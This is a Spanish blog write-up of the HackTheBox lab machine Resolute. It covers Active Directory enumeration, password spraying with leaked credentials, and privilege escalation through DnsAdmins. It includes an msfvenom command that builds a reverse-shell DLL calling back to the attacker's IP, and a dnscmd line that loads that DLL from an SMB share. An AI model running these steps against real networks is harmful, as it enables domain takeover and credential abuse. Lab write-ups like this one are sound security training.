<!DOCTYPE html><html lang="es" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="Resolute - Write Up (HTB) ❤" /><meta name="author" content="sha16" /><meta property="og:locale" content="es" /><meta name="description" content="Buenas a tod@s, el día de hoy les traigo un write-up de la máquina Resolute de HackTheBox." /><meta property="og:description" content="Buenas a tod@s, el día de hoy les traigo un write-up de la máquina Resolute de HackTheBox." /><link rel="canonical" href="https://sha-16.github.io/posts/Resolute-HackTheBox-Machine/" /><meta property="og:url" content="https://sha-16.github.io/posts/Resolute-HackTheBox-Machine/" /><meta property="og:site_name" content="sha16" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-10-16T00:00:00-03:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Resolute - Write Up (HTB) ❤" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"sha16"},"description":"Buenas a tod@s, el día de hoy les traigo un write-up de la máquina Resolute de HackTheBox.","url":"https://sha-16.github.io/posts/Resolute-HackTheBox-Machine/","@type":"BlogPosting","headline":"Resolute - Write Up (HTB) ❤","dateModified":"2023-10-16T08:13:42-03:00","datePublished":"2023-10-16T00:00:00-03:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://sha-16.github.io/posts/Resolute-HackTheBox-Machine/"},"@context":"https://schema.org"}</script><title>Resolute - Write Up (HTB) ❤ | sha16</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="sha16"><meta name="application-name" content="sha16"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/sha-16.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">sha16</a></div><div class="site-subtitle font-italic">❤ Pentester / Red Team</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/sha-16" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://www.youtube.com/channel/UCZrqUzohXiWRaJ7YdhVpZqA/videos" aria-label="youtube" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-youtube"></i> </a> <a href="https://twitch.tv/sha_16_/" aria-label="twitch" class="order-5" target="_blank" rel="noopener"> <i class="fab fa-twitch"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Resolute - Write Up (HTB) ❤</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Resolute - Write Up (HTB) ❤</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> sha16 </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Mon, Oct 16, 2023, 12:00 AM -0300" >Oct 16<i class="unloaded">2023-10-16T00:00:00-03:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Mon, Oct 16, 2023, 8:13 AM -0300" >Oct 16<i class="unloaded">2023-10-16T08:13:42-03:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="776 words">4 min read</span></div></div><div class="post-content"><p>Buenas a tod@s, el día de hoy les traigo un <code class="language-plaintext highlighter-rouge">write-up</code> de la máquina <code class="language-plaintext highlighter-rouge">Resolute</code> de <code class="language-plaintext highlighter-rouge">HackTheBox</code>.</p><p><img data-proofer-ignore data-src="/assets/img/htb/machines/Resolute/Untitled.png" alt="Untitled" /></p><p>Como en cada <code class="language-plaintext highlighter-rouge">write-up</code>, lo primero hacemos es lanzar un escaneo de puertos con <code class="language-plaintext highlighter-rouge">nmap</code> con el objetivo de identificar potenciales vías de ataque.</p><p>Como podrán ver a continuación, se específica el parámetro <code class="language-plaintext highlighter-rouge">-sS</code> con el objetivo de que el escaneo sea vía <code class="language-plaintext highlighter-rouge">TCP SYNC</code>, lo que de cierto modo me permitirá agilizarlo, debido a que no hay <code class="language-plaintext highlighter-rouge">Three-Way-HandShake</code> como en <code class="language-plaintext highlighter-rouge">TCP</code>.</p><p>Lo otro es que se configura el <code class="language-plaintext highlighter-rouge">--min-rate</code> en <code class="language-plaintext highlighter-rouge">3000</code> con la idea de no enviar una cantidad menor a <code class="language-plaintext highlighter-rouge">3000</code> paquetes por segundo.</p><p><strong>Advertencia:</strong> No aconsejo lanzar este escaneo en entornos productivos debido a que es ultra ruidoso y agresivo. En este caso lo estoy lanzando en un entorno controlado de <code class="language-plaintext highlighter-rouge">HackTheBox</code>.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nmap <span class="nt">-v</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 3000 <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-p-</span> 10.10.10.169 <span class="nt">-oG</span> tcp_ports.txt
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/img/htb/machines/Resolute/Untitled%201.png" alt="Untitled" /></p><p>En el resultado del escaneo, se identifican varios servicios de interés, entre ellos: WinRPC, SMB, LDAP, WinRM y Kerberos. Sin embargo, ya con sólo ver al servicio <code class="language-plaintext highlighter-rouge">Kerberos</code>, podemos deducir que estamos ante un entorno de <em>Active Directory</em>. Por lo que ya podemos saber más o menos cómo enforcar nuestra estrategia de ataque y enumeración.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nmap <span class="nt">-v</span> <span class="nt">-sCV</span> <span class="nt">-p53</span>,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49682,49714,49839 10.10.10.169 <span class="nt">-oN</span> port_scan.txt
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/img/htb/machines/Resolute/Untitled%202.png" alt="Untitled" /></p><p>Uno de los primeros problemas de seguridad que identificamos al enumerar la máquina, es que te puedes autenticar sobre el servicio LDAP sin necesidad de una contraseña, pudiendo listar información sensible del dominio, tal como usuarios, propiedades de objetos, etc.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ldapsearch <span class="nt">-H</span> ldap://10.10.10.169 <span class="nt">-w</span> <span class="s1">''</span> <span class="nt">-x</span> <span class="nt">-b</span> <span class="s1">'DC=megabank,DC=local'</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/img/htb/machines/Resolute/Untitled%203.png" alt="Untitled" /></p><p>De la misma forma, esto ocurre con WinRPC, donde nos podemos autenticarnos con el <em>null session</em> y listar a todos los usuarios del dominio.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>rpcclient <span class="nt">-N</span> <span class="nt">-U</span> <span class="s1">''</span> megabank.local
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/img/htb/machines/Resolute/Untitled%204.png" alt="Untitled" /></p><p>Al listar las descripciones de cada usuario, identificamos que en la del usuario <code class="language-plaintext highlighter-rouge">marko</code> hay una contraseña <code class="language-plaintext highlighter-rouge">Welcome123!</code>.</p><p><img data-proofer-ignore data-src="/assets/img/htb/machines/Resolute/Untitled%205.png" alt="Untitled" /></p><p>Teniendo una contraseña potencialmente válida, realizamos un <em>Password Sprying</em> donde identificamos que esta la pertenece al usuario <code class="language-plaintext highlighter-rouge">melanie</code>.</p><p><img data-proofer-ignore data-src="/assets/img/htb/machines/Resolute/Untitled%206.png" alt="Untitled" /></p><p>Al validar la credencial sobre el servicio WinRM, descubrimos que el usuario <code class="language-plaintext highlighter-rouge">melanie</code> forma parte del grupo <code class="language-plaintext highlighter-rouge">Remote Management Users</code>, por lo que podemos obtener acceso directo hacía una consola en el servidor con la herramienta <code class="language-plaintext highlighter-rouge">evil-winrm</code>.</p><p><img data-proofer-ignore data-src="/assets/img/htb/machines/Resolute/Untitled%207.png" alt="Untitled" /></p><p>Habiendo obtenido acceso al servidor, identificamos la carpeta <code class="language-plaintext highlighter-rouge">PSTranscripts</code>, la cual no forma parte del listado común de directorios en la raíz de los sistemas operativos Windows.</p><p><img data-proofer-ignore data-src="/assets/img/htb/machines/Resolute/Untitled%208.png" alt="Untitled" /></p><p>Al revisar dicho directorio, se identifica otro directorio dentro de este, el cual posee un archivo de texto.</p><p><img data-proofer-ignore data-src="/assets/img/htb/machines/Resolute/Untitled%209.png" alt="Untitled" /></p><p>Al revisar dicho archivo, se identifican comandos de consola, los cuales muestran intentos de autenticación sobre un recurso de red, con la contraseña del usuario <code class="language-plaintext highlighter-rouge">ryan</code>.</p><p><img data-proofer-ignore data-src="/assets/img/htb/machines/Resolute/Untitled%2010.png" alt="Untitled" /></p><p>Esta contraseña es validada con <code class="language-plaintext highlighter-rouge">crackmapexec</code>, herramienta con la cual validamos que el usuario <code class="language-plaintext highlighter-rouge">ryan</code> también pertenece al grupo <code class="language-plaintext highlighter-rouge">Remote Management Users</code>.</p><p><img data-proofer-ignore data-src="/assets/img/htb/machines/Resolute/Untitled%2011.png" alt="Untitled" /></p><p>Posterior a esto, antes de autenticarnos con el usuario <code class="language-plaintext highlighter-rouge">ryan</code>, lanzamos la herramienta <code class="language-plaintext highlighter-rouge">SharpHound.exe</code>, con el objetivo de listar potenciales vectores de ataque que puedan existir entre las relaciones establecidas entre los distintos objetos que componen al AD.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span text-data=" Powershell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">cmd</span><span class="w"> </span><span class="nx">/c</span><span class="w"> </span><span class="nx">SharpHound.exe</span><span class="w"> </span><span class="nt">--CollectionMethods</span><span class="w"> </span><span class="nx">All</span><span class="w">
</span></pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/img/htb/machines/Resolute/Untitled%2012.png" alt="Untitled" /></p><p>Analizando el esquema de relación, detectamos que el usuario forma parte del grupo <code class="language-plaintext highlighter-rouge">Contractors</code>, el cual a su vez pertenece al grupo privilegiado, <code class="language-plaintext highlighter-rouge">DnsAdmins</code>.</p><p>En este punto, hemos encontrado el vector de escalada de privilegios, debido a que el grupo <code class="language-plaintext highlighter-rouge">DnsAdmins</code> forma parte de los objetos críticos del directorio activo. Esto significa que, un usuario que forma parte de este, tiene la capacidad de controlar la totalidad del servicio, incluida las DLLs que se ejecutan en contexto privilegiado.</p><p><img data-proofer-ignore data-src="/assets/img/htb/machines/Resolute/Untitled%2013.png" alt="Untitled" /></p><p>Por lo tanto, dado que tenemos control total del servicio, podemos crear una DLL maliciosa con la herramienta <code class="language-plaintext highlighter-rouge">MSFvenom</code>, la cual está compilada para enviarnos una <em>reverse shell</em> a nuestra máquina, al puerto <code class="language-plaintext highlighter-rouge">443</code> en escucha.</p><p>Es importante destacar que esta DLL, sobre la cual tenemos control, se ejecuta en un contexto de máximos privilegios en el servidor.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span text-data=" Powershell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">msfvenom</span><span class="w"> </span><span class="nt">-a</span><span class="w"> </span><span class="nx">x64</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nx">windows/x64/shell_reverse_tcp</span><span class="w"> </span><span class="nt">-e</span><span class="w"> </span><span class="nx">x64/xor</span><span class="w"> </span><span class="nx">LHOST</span><span class="o">=</span><span class="mf">10.10</span><span class="o">.</span><span class="nf">17</span><span class="o">.</span><span class="nf">210</span><span class="w"> </span><span class="n">LPORT</span><span class="o">=</span><span class="mi">443</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="n">dll</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="nx">dnsadmin_priv.dll</span><span class="w">
</span></pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/img/htb/machines/Resolute/Untitled%2014.png" alt="Untitled" /></p><p>Posterior a esto, con la herramienta <code class="language-plaintext highlighter-rouge">dnscmd.exe</code>, la cual es utilizada para administrar el DNS, añadimos la DLL como un <em>plugin</em> del servicio.</p><p>Cabe destacar que la DLL se encuentra servida en una carpeta compartida por SMB, en nuestro servidor atacante.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span text-data=" Powershell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">dnscmd.exe</span><span class="w"> </span><span class="nx">RESOLUTE</span><span class="w"> </span><span class="nx">/config</span><span class="w"> </span><span class="nx">/serverlevelplugindll</span><span class="w"> </span><span class="nx">\\10.10.17.210\smb\dnsadmin_priv.dll</span><span class="w">
</span></pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/img/htb/machines/Resolute/Untitled%2015.png" alt="Untitled" /></p><p>Como se observó en la imagen anterior, la configuración es aplicada exitosamente.</p><p>En base a esto, se reinicia el servidor DNS, lo cual provoca que automáticamente se invoque y ejecute nuestra DLL, a través del servicio SMB.</p><p><img data-proofer-ignore data-src="/assets/img/htb/machines/Resolute/Untitled%2016.png" alt="Untitled" /></p><p>Habiéndose ejecutado, recibimos con éxito la <em>reverse shell</em> de <code class="language-plaintext highlighter-rouge">NT Authority\System</code>, en el puerto en escucha de nuestra máquina. De esta manera, logramos control total del <em>Domain Controller</em>.</p><p><img data-proofer-ignore data-src="/assets/img/htb/machines/Resolute/Untitled%2017.png" alt="Untitled" /></p><h3 id="referencias">Referencias</h3><ul><li>DNSAdmin to DC compromise in one line (by Shay Ber): <a href="https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83">https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83</a><li>dnscmd (Microsoft Learn): <a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd">https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd</a><li>DnsAdmins to DomainAdmin: <a href="https://www.hackingarticles.in/windows-privilege-escalation-dnsadmins-to-domainadmin/">https://www.hackingarticles.in/windows-privilege-escalation-dnsadmins-to-domainadmin/</a></ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a>, <a href='/categories/active-directory/'>Active Directory</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/abusing-dnsadmins-group/" class="post-tag no-text-decoration" >Abusing DNSAdmins Group</a> <a href="/tags/active-directory/" class="post-tag no-text-decoration" >Active Directory</a> <a href="/tags/null-session-via-rpc/" class="post-tag no-text-decoration" >Null Session via RPC</a> <a href="/tags/password-spraying/" class="post-tag no-text-decoration" >Password Spraying</a> <a href="/tags/password-exposed-via-rpc/" class="post-tag no-text-decoration" >Password exposed via RPC</a> <a href="/tags/windows/" class="post-tag no-text-decoration" >Windows</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://github.com/sha-16" data-toggle="tooltip" data-placement="top" title="github" target="_blank" rel="noopener" aria-label="github"> <i class="fa-fw fab fa-github"></i> </a> <a href="https://twitter.com/sha16_x" data-toggle="tooltip" data-placement="top" title="twitter" target="_blank" rel="noopener" aria-label="twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.youtube.com/channel/UCZrqUzohXiWRaJ7YdhVpZqA/videos" data-toggle="tooltip" data-placement="top" title="youtube" target="_blank" rel="noopener" aria-label="youtube"> <i class="fa-fw fab fa-youtube"></i> </a> <a href="https://twitch.tv/sha_16_/" data-toggle="tooltip" data-placement="top" title="twitch" target="_blank" rel="noopener" aria-label="twitch"> <i class="fa-fw fab fa-twitch"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Resolute-HackTheBox-Machine/">Resolute - Write Up (HTB) ❤</a><li><a href="/posts/Forest-HackTheBox-Machine/">Forest - Write Up (HTB) ❤</a><li><a href="/posts/Sauna-HackTheBox-Machine/">Sauna - Write Up (HTB) ❤</a><li><a href="/posts/Active-HackTheBox-Machine/">Active - Write Up (HTB) ❤</a><li><a href="/posts/Blackfield-HackTheBox-Machine/">Blackfield - Write Up (HTB) ❤</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/64-bit/">64-bit</a> <a class="post-tag" href="/tags/active-directory/">Active Directory</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/as-rep-roasting/">AS-REP Roasting</a> <a class="post-tag" href="/tags/abusing-dcsync/">Abusing DCSync</a> <a class="post-tag" href="/tags/abusing-account-operators/">Abusing Account Operators</a> <a class="post-tag" href="/tags/abusing-backup-operators/">Abusing Backup Operators</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Forest-HackTheBox-Machine/"><div class="card-body"> <span class="timeago small" >Sep 27<i class="unloaded">2023-09-27T00:00:00-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Forest - Write Up (HTB) ❤</h3><div class="text-muted small"><p> Buenas a tod@s, el día de hoy les traigo un write-up de la máquina Forest de HackTheBox. Como en cada write-up, lo primero hago es lanzar un escaneo de puertos con nmap con el objetivo de identi...</p></div></div></a></div><div class="card"> <a href="/posts/Sauna-HackTheBox-Machine/"><div class="card-body"> <span class="timeago small" >Oct 1<i class="unloaded">2023-10-01T00:00:00-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Sauna - Write Up (HTB) ❤</h3><div class="text-muted small"><p> Buenas a tod@s, el día de hoy les traigo un write-up de la máquina Sauna de HackTheBox. Como en cada write-up, lo primero hacemos es lanzar un escaneo de puertos con nmap con el objetivo de iden...</p></div></div></a></div><div class="card"> <a href="/posts/Active-HackTheBox-Machine/"><div class="card-body"> <span class="timeago small" >Oct 5<i class="unloaded">2023-10-05T00:00:00-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Active - Write Up (HTB) ❤</h3><div class="text-muted small"><p> Buenas a tod@s, el día de hoy les traigo un write-up de la máquina Active de HackTheBox. Como en cada write-up, lo primero hacemos es lanzar un escaneo de puertos con nmap con el objetivo de ide...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Blackfield-HackTheBox-Machine/" class="btn btn-outline-primary" prompt="Older"><p>Blackfield - Write Up (HTB) ❤</p></a> <span class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></span></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://github.com/sha-16">Diego Osorio</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/64-bit/">64 bit</a> <a class="post-tag" href="/tags/active-directory/">Active Directory</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/as-rep-roasting/">AS REP Roasting</a> <a class="post-tag" href="/tags/abusing-dcsync/">Abusing DCSync</a> <a class="post-tag" href="/tags/abusing-account-operators/">Abusing Account Operators</a> <a class="post-tag" href="/tags/abusing-backup-operators/">Abusing Backup Operators</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag 